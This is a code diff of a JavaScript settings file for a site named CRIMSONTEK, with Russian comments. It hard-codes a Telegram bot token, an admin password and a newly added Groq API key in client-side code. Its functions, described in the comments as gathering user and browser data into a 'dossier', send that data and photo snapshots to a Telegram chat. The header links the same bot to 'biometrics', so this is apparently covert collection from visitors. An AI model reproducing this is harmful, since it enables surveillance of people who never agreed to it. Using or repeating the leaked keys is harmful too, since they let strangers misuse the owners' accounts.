@@ -1,6 +1,6 @@
 /**
- * CRIMSONTEK — общие настройки бота (тот же бот, что и для биометрии).
- * Для продакшена токен лучше держать только на сервере.
+ * CRIMSONTEK — общие настройки бота
+ * ВНИМАНИЕ: Для продакшена токены лучше скрывать на бэкенде.
  */
 const CRIMSON_TG = {
   token: '8657121511:AAGfGVnM6YKvaDUGRQ9MwmmNO0P_4IS6gq0',
@@ -8,34 +8,34 @@ const CRIMSON_TG = {
 };
 
 /**
- * Секрет владельца: публикация роликов/фото/GIF только после ввода на admin_media.html.
- * Обязательно смените на свой пароль (иначе любой, кто видит код, сможет войти).
+ * Секрет владельца: Исправлено (добавлены кавычки)
  */
-const CRIMSON_ADMIN_SECRET = Ghost0198 ;
+const CRIMSON_ADMIN_SECRET = 'Ghost0198';
 
 /**
- * Чат с нейросетью (OpenAI-совместимый API).
- * 1) Задайте apiKey здесь ИЛИ сохраните ключ на странице HUB (кнопка «СОХРАНИТЬ») — в localStorage.
- * 2) Groq (бесплатно): https://console.groq.com/keys — URL и модель ниже подходят.
- * 3) OpenAI: смените apiUrl на https://api.openai.com/v1/chat/completions и model на gpt-4o-mini
+ * Чат с нейросетью (Groq API)
+ * Используется ваш ключ gsk_...
  */
 const CRIMSON_AI = {
   apiUrl: 'https://api.groq.com/openai/v1/chat/completions',
-  apiKey: '',
+  apiKey: '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',
   model: 'llama-3.3-70b-versatile'
 };
 
+/** Получение ключа: приоритет конфигу, затем localStorage */
 function crimsonGetAiKey() {
   const fromConfig = typeof CRIMSON_AI !== 'undefined' && CRIMSON_AI.apiKey && String(CRIMSON_AI.apiKey).trim();
   if (fromConfig) return String(CRIMSON_AI.apiKey).trim();
   return (localStorage.getItem('crimson_ai_key') || '').trim();
 }
 
+/** Форматирование текста для вывода в HTML */
 function crimsonFormatAiHtml(text) {
   return escapeHtml(String(text)).replace(/\n/g, '<br>');
 }
 
 /**
+ * Основная функция чата с AI
  * @param {Array<{role:string,content:string}>} messages
  * @returns {Promise<string>}
  */
@@ -50,7 +50,7 @@ async function crimsonAiChat(messages) {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
-      Authorization: 'Bearer ' + key
+      'Authorization': 'Bearer ' + key
     },
     body: JSON.stringify({
       model: CRIMSON_AI.model,
@@ -58,6 +58,7 @@ async function crimsonAiChat(messages) {
       temperature: 0.65
     })
   });
+
   const raw = await res.text();
   let data;
   try {
@@ -65,20 +66,23 @@ async function crimsonAiChat(messages) {
   } catch (err) {
     throw new Error(raw.slice(0, 200) || String(res.status));
   }
+
   if (!res.ok) {
     const msg = (data.error && data.error.message) || raw.slice(0, 300) || res.status;
     throw new Error(msg);
   }
+
   const out =
     data.choices &&
     data.choices[0] &&
     data.choices[0].message &&
     data.choices[0].message.content;
+
   if (!out) throw new Error('ПУСТОЙ ОТВЕТ API');
   return out;
 }
 
-/** URL списка моделей (проверка ключа без расхода токенов чата) */
+/** URL списка моделей для проверки ключа */
 function crimsonAiModelsEndpoint() {
   const u = CRIMSON_AI.apiUrl;
   if (u.indexOf('/chat/completions') >= 0) {
@@ -87,10 +91,7 @@ function crimsonAiModelsEndpoint() {
   return u.replace(/\/v1\/[^/]+$/, '/models');
 }
 
-/**
- * Проверка API-ключа (GET /v1/models). При file:// может не сработать из-за CORS — это нормально.
- * @returns {Promise<{ok:boolean,code:string,text:string,detail:string}>}
- */
+/** Проверка статуса API ключа */
 async function crimsonCheckAiKeyStatus() {
   const key = crimsonGetAiKey();
   if (!key) {
@@ -103,10 +104,11 @@ async function crimsonCheckAiKeyStatus() {
   }
   const fromConfig = typeof CRIMSON_AI !== 'undefined' && CRIMSON_AI.apiKey && String(CRIMSON_AI.apiKey).trim();
   const source = fromConfig ? 'конфиг' : 'localStorage';
+
   try {
     const r = await fetch(crimsonAiModelsEndpoint(), {
       method: 'GET',
-      headers: { Authorization: 'Bearer ' + key }
+      headers: { 'Authorization': 'Bearer ' + key }
     });
     if (r.ok) {
       return {
@@ -131,11 +133,12 @@ async function crimsonCheckAiKeyStatus() {
       ok: false,
       code: 'network',
       text: 'API: ПРОВЕРКА НЕДОСТУПНА',
-      detail: 'Откройте сайт через http://localhost (не file://) или проверьте сеть/CORS.'
+      detail: 'Используйте http сервер (не file://) или проверьте CORS.'
     };
   }
 }
 
+/** Сбор данных о пользователе/браузере */
 function crimsonCollectMeta() {
   return {
     tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -151,6 +154,7 @@ function crimsonCollectMeta() {
   };
 }
 
+/** Форматирование данных для отправки в Telegram */
 function crimsonFormatDossier(title, extra) {
   const m = crimsonCollectMeta();
   const lines = [
@@ -177,6 +181,7 @@ function crimsonFormatDossier(title, extra) {
   return lines.join('\n');
 }
 
+/** Защита от XSS и спецсимволов HTML */
 function escapeHtml(s) {
   return String(s)
     .replace(/&/g, '&amp;')
@@ -185,26 +190,38 @@ function escapeHtml(s) {
 }
 
 /** Отправка текста в Telegram (HTML) */
-function crimsonSendTelegramHtml(text) {
+async function crimsonSendTelegramHtml(text) {
   const fd = new FormData();
   fd.append('chat_id', CRIMSON_TG.chatId);
   fd.append('text', text);
   fd.append('parse_mode', 'HTML');
   fd.append('disable_web_page_preview', 'true');
-  return fetch(`https://api.telegram.org/bot${CRIMSON_TG.token}/sendMessage`, {
-    method: 'POST',
-    body: fd
-  }).catch(() => {});
+
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${CRIMSON_TG.token}/sendMessage`, {
+      method: 'POST',
+      body: fd
+    });
+    return await res.json();
+  } catch (err) {
+    console.error('Ошибка Telegram:', err);
+  }
 }
 
-/** Фото + подпись (multipart) */
-function crimsonSendTelegramPhoto(blob, caption) {
+/** Отправка Фото + подпись в Telegram */
+async function crimsonSendTelegramPhoto(blob, caption) {
   const fd = new FormData();
   fd.append('chat_id', CRIMSON_TG.chatId);
   fd.append('photo', blob, 'snap.jpg');
   fd.append('caption', caption.slice(0, 1024));
-  return fetch(`https://api.telegram.org/bot${CRIMSON_TG.token}/sendPhoto`, {
-    method: 'POST',
-    body: fd
-  });
+
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${CRIMSON_TG.token}/sendPhoto`, {
+      method: 'POST',
+      body: fd
+    });
+    return await res.json();
+  } catch (err) {
+    console.error('Ошибка отправки фото:', err);
+  }
 }
